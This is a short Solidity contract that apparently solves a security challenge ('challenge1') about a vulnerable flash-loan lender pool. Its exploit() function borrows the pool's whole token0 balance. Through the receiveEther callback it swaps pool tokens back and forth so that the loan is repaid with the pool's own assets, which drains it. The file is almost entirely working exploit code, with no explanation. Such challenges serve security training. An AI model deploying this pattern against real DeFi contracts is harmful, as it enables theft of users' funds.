pragma solidity ^0.8.0;
import "../challenge1/TrusterLenderPool.sol";

contract TrusterLenderPoolSolution {
    TrusterLenderPool trusterLenderPool;
    IERC20 token0;
    IERC20 token1;
    uint256 borrowAmount;

    constructor(address target) {
        trusterLenderPool = TrusterLenderPool(target);
        token0 = IERC20(trusterLenderPool.token0());
        token1 = IERC20(trusterLenderPool.token1());
        borrowAmount = token0.balanceOf(address(trusterLenderPool));
    }

    function exploit() public {
        trusterLenderPool.flashLoan(borrowAmount, address(this));
        token1.approve(address(trusterLenderPool), borrowAmount);
        trusterLenderPool.swap(address(token0), borrowAmount);
    }

    function receiveEther(uint256) public payable {
        token0.approve(address(trusterLenderPool), borrowAmount);
        trusterLenderPool.swap(address(token1), borrowAmount);
    }
}
